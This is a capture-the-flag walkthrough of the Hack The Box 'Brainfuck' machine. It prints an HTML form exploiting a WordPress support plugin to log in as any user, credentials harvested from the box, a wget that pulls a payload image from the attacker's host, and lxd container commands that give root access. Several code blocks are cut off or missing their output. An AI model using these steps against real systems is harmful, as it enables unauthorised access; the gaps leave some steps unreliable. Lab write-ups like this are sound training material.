An insane box on the list? Really?

# Configuration

The operating system that I will be using to tackle this machine is a Kali Linux VM.

What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.

```bash
$ echo "10.10.10.17 brainfuck.htb" | sudo tee -a /etc/hosts
```

# Reconnaissance

```bash
$ nmap -sT -sV -sC -Pn brainfuck.htb 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-08 06:06 EST

If we check out the `wp-support-plus-responsive-ticket-system` plugin, we realise that the version (`7.1.3`) had exploits online.

```bash
$ searchsploit wordpress support plus 7.1.3
--------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                         |  Path

WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection        | php/webapps/40939.txt
--------------------------------------------------------------------------------------- ---------------------------------
```

The "Privilege Escalation" vulnerability would allow us to login as anyone without knowing the password, so lets use that.

```bash
$ searchsploit -m 41006                     
  Exploit: WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation

File Type: ASCII text, with CRLF line terminators

Copied to: /home/kali/Desktop/htb/brainfuck/41006.txt

```

# Exploitation (1)

```

$ cat exploit.html
<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>
```

Now, to use it, we just need to open the page with `firefox` and hit `Login`.

```bash
$ firefox exploit.html
```

![](/assets/images/brainfuck2.png)

Now, if we go to `https://brainfuck.htb/wp-admin/`, we have managed to login as `administrator`!

![](/assets/images/brainfuck3.png)

However, even as `administrator`, we are not able to perform much administrative actions. Lets see if there are any other users we can log into using `wp-scan`.

```bash
$ wpscan --disable-tls-checks  --url https://brainfuck.htb --enumerate u

It seems there is another user called `admin`. Let try changing from `administrator` to `admin` in `exploit.html` and logging in. Remember to clear your cookies first!

After clicking `Login` and accessing `https://brainfuck.htb/wp-admin/`, we finally see more pages that we can access!

# Enumeration (2)

## Port 443 `nginx 1.10.0`

![](/assets/images/brainfuck6.png)

Under "Plugins", if we view the settings of the "Easy WP SMTP" plugin, 

![](/assets/images/brainfuck7.png)

We see some interesting settings being saved, including a `SMTP` username and even a `SMTP` password! If we press on `F12` to enter Developer's Mode and view the `HTML` source code, we can see a password being stored as the `value` attribute.

![](/assets/images/brainfuck8.png)

Together with the username and password that we found, we get `orestis:kHGuERB29DNiNE`.

## Port 143 ` Dovecot imapd`

Using `nc`, we can access the `IMAP` service on port `143` and login as `orestis`.

```bash
$ nc -v brainfuck.htb 143

It seems there's no mail here for us to read.

Using `nc`, we can access the `POP3` service on port `110` and login as `orestis`.

```bash

Hi there, your credentials for our "secret" forum are below :)

username: orestis
password: kIEnnfEKJ#9UmdO

Regards
.
```

We found a mail talking about a "secret" forum and it even included credentials to login!

## Port 443 `nginx 1.10.0`

Where is this "secret" forum? If we view the certificate on the `Wordpress` website, we will see another domain name under "Subject Alt Names" called `sup3rs3cr3t.brainfuck.htb`. Lets add this domain to our `/etc/hosts` and access it.

```bash
$ cat /etc/hosts
...
10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb
```

![](/assets/images/brainfuck9.png)

After logging in with `orestis:kIEnnfEKJ#9UmdO`, we see more threads.

![](/assets/images/brainfuck10.png)

The `Key` thread had some messages but appear to be jibberish.

![](/assets/images/brainfuck11.png)

The `SSH Access` thread talked about `orestis`'s `SSH` key and it will be further discussed in an encrypted thread, which is probably the `Key` thread we found.

![](/assets/images/brainfuck12.png)

One thing to note is that the user `orestis` always end his messages with `Orestis - Hacking for fun and profit`. Maybe this can help us figure out how to decrypt this?

### Vignere Cipher

The last line in `orestis`'s messages in the `Key` thread are the encrypted version of `Orestis - Hacking for fun and profit`, using the Vignere Cipher. Using a `python` script I made, we are able to retrieve the password that was used.

```python
ciphertext = "Pieagnm - Jkoijeg nbw zwx mle grwsnn".replace(" ","").replace("-","")
plaintext =  "Orestis - Hacking for fun and profit".replace(" ","").replace("-","")

output = ""

for idx in range(len(plaintext)):

        diff = (ord(ciphertext[idx]) - ord(plaintext[idx])) % 26

        if ciphertext[idx].isupper():
                output += chr(ord('A') + diff)
        else:
                output += chr(ord('a') + diff)

print(output)
```

```bash
BrainfuCkmybrainfuckmybrainfu
```

In Vignere Cipher, the key that is used is repeated multiple times in order to match the length of the plaintext. Hence, the key is `fuckmybrain`.

Using this key and [Cyberchef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('fuckmybrain')&input=WWJnYnEgd3BsIGd3IGx0byB1ZGduanUgZmNwcCwgQyBqeWJjIHpmdSB6cnJ5b2xxcCB6ZnV6IHhqcyBya2VxeGZybCBvandjZWVjIEogdW92ZyA6KQoKbW52emU6Ly8xMC4xMC4xMC4xNy84emI1cmExMG05MTUyMTg2OTdxMWg2NTh3Zm9xMHpjOC9mcm1meWN1L3NwX3B0cg), we are able to decrypt `admin`'s message to get a link to an `RSA` private key!

![](/assets/images/brainfuck13.png)

### Passphrase-protected private SSH Key

After downloading the key, we attempt to login to `orestis` with it but failed as it is protected with a passphrase.

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa orestis@brainfuck.htb
The authenticity of host 'brainfuck.htb (10.10.10.17)' can't be established.

Using `ssh2john`, we can extract a hash of the passphrase and crack it with `john`.

With the passphrase and the private `SSH` key, we can now login as `orestis` and get the user flag.

```bash
$ ssh -i id_rsa orestis@brainfuck.htb

From my understanding, the root flag was encrypted with RSA with the `p`, `q` and `e` values provided in the `debug.txt` and the output was saved in `output.txt`. I had a fair bit of CTF experience so decrypting it was no problem :)

This script require the `pycrypto` module, which can be installed like this:

```
$ sudo pip3 install pycrypto
```

```python
from Crypto.Util.number import long_to_bytes

# From debug.txt

# root.txt (1)

Running the script will output the plaintext root flag.

```
b'6efcXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
```

However, according to OSCP exam's standard, we will need to get a working shell as `root` so lets try harder.

# Enumeration (4)

The current user `orestis` is in the `lxd` group.

```bash
orestis@brainfuck:/tmp$ id
uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
```

As a member of the `lxd` group, we can spawn a `lxc` container that mounts the file system and allow us to read files as `root`!

# Exploitation (2)

As there are no images available on the box, we can transfer one over from our box and add it.

```bash
$ git clone https://github.com/saghul/lxd-alpine-builder
$ cd lxd-alpine-builder
$ sudo ./build-alpine
...
$ ls 
alpine-v3.12-x86_64-20210108_0810.tar.gz 
```

We can then transfer the image over by using the `SimpleHTTPServer` module or using a recent useful tool I found called [`updog`](https://github.com/sc0tfree/updog).

On the attacker machine:
```bash
$ sudo updog -p 80                              
[+] Serving /home/kali/Desktop/htb/brainfuck/lxd-alpine-builder...
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
```

On the `Brainfuck` machine:
```bash
orestis@brainfuck:/tmp$ wget http://10.10.X.X/alpine-v3.12-x86_64-20210108_0810.tar.gz
```

Finally, we can just execute a series of commands to gain `root` access:

```bash
orestis@brainfuck:/tmp$ lxc image import alpine-v3.12-x86_64-20210108_0810.tar.gz 
Image imported with fingerprint: 471bec5017c23d969a92020aabb84dadd3df90cdad571ad8a581ae13b4b010e8
orestis@brainfuck:/tmp$ lxc image import alpine-v3.12-x86_64-20210108_0810.tar.gz --alias myimage
Transferring image: 100% (267.12MB/s)error: UNIQUE constraint failed: images.fingerprint
orestis@brainfuck:/tmp$ lxc init myimage myexploit -c security.privileged=true
Creating myexploit
orestis@brainfuck:/tmp$ lxc config device add myexploit mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to myexploit
orestis@brainfuck:/tmp$ lxc start init 
orestis@brainfuck:/tmp$ lxc exec init /bin/sh
~ # id
uid=0(root) gid=0(root)
```

And get our flag:

```bash
~ # cat /mnt/root/root/root.txt
6efcXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```
